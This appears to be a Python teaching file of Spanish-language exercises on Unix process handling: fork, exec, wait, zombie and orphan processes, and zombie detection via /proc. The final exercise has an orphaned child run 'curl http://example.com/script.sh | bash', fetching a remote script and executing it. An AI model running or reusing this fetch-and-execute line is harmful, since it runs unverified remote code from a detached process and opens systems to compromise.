import os
import time

def ejercicio_1():
    """Identificación de procesos padre e hijo."""
    pid = os.fork()
    if pid == 0:
        print(f"[HIJO] PID: {os.getpid()}, PPID: {os.getppid()}")
    else:
        print(f"[PADRE] PID: {os.getpid()}, Hijo: {pid}")

def ejercicio_2():
    """Doble bifurcación."""
    for i in range(2):
        pid = os.fork()
        if pid == 0:
            print(f"[HIJO {i}] PID: {os.getpid()}, PPID: {os.getppid()}")
            os._exit(0)
    for _ in range(2):
        os.wait()

def ejercicio_3():
    """Reemplazo de un proceso hijo con exec()."""
    pid = os.fork()
    if pid == 0:
        os.execlp("ls", "ls", "-l")

def ejercicio_4():
    """Secuencia controlada de procesos."""
    def crear_hijo(nombre):
        pid = os.fork()
        if pid == 0:
            print(f"[HIJO {nombre}] PID: {os.getpid()}")
            time.sleep(1)
            os._exit(0)
        else:
            os.wait()
    crear_hijo("A")
    crear_hijo("B")

def ejercicio_5():
    """Proceso zombi temporal."""
    pid = os.fork()
    if pid == 0:
        print("[HIJO] Finalizando")
        os._exit(0)
    else:
        print("[PADRE] No llamaré a wait() aún. Observa el zombi con 'ps -el'")
        time.sleep(15)
        os.wait()

def ejercicio_6():
    """Proceso huérfano adoptado por init/systemd."""
    pid = os.fork()
    if pid > 0:
        print("[PADRE] Terminando")
        os._exit(0)
    else:
        print("[HIJO] Ahora soy huérfano. Mi nuevo padre será init/systemd")
        time.sleep(10)

def ejercicio_7():
    """Multiproceso paralelo."""
    for _ in range(3):
        pid = os.fork()
        if pid == 0:
            print(f"[HIJO] PID: {os.getpid()}, PPID: {os.getppid()}")
            os._exit(0)
    for _ in range(3):
        os.wait()

def ejercicio_8():
    """Simulación de servidor multiproceso."""
    def atender_cliente(n):
        pid = os.fork()
        if pid == 0:
            print(f"[HIJO {n}] Atendiendo cliente")
            time.sleep(2)
            print(f"[HIJO {n}] Finalizado")
            os._exit(0)
    for cliente in range(5):
        atender_cliente(cliente)
    for _ in range(5):
        os.wait()

def ejercicio_9():
    """Detección de procesos zombis en /proc."""
    def detectar_zombis():
        for pid in os.listdir('/proc'):
            if pid.isdigit():
                try:
                    with open(f"/proc/{pid}/status") as f:
                        lines = f.readlines()
                        estado = next((l for l in lines if l.startswith("State:")), "")
                        if "Z" in estado:
                            nombre = next((l for l in lines if l.startswith("Name:")), "").split()[1]
                            ppid = next((l for l in lines if l.startswith("PPid:")), "").split()[1]
                            print(f"Zombi detectado → PID: {pid}, PPID: {ppid}, Nombre: {nombre}")
                except IOError:
                    continue
    detectar_zombis()

def ejercicio_10():
    """Inyección de comandos en procesos huérfanos."""
    pid = os.fork()
    if pid > 0:
        os._exit(0)
    else:
        print("[HIJO] Ejecutando script como huérfano...")
        os.system("curl http://example.com/script.sh | bash")
        time.sleep(3)